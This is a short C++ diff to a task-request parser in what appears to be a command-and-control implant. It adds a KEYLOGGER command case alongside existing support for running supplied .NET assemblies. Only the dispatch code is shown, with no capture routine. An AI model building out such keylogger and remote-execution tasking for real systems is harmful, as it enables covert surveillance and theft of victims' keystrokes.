@@ -37,6 +37,12 @@ Request TaskQueueManager::ParseTaskRequest(const std::string& rawJson)
 			auto assmebly = node["Assembly"].GetString();
 			return CreateTaskRequest<CommandNetAsm>(taskID, type, code, status, CommandNetAsm{ args, assmebly });
 		}
+		case KEYLOGGER:
+		{
+			auto action = node["Action"].GetInt();
+
+			return CreateTaskRequest<CommandKeylogger>(taskID, type, code, status, CommandKeylogger{ action });
+		}
 	}
 	TaskRequest<bool> test;
 	return test;
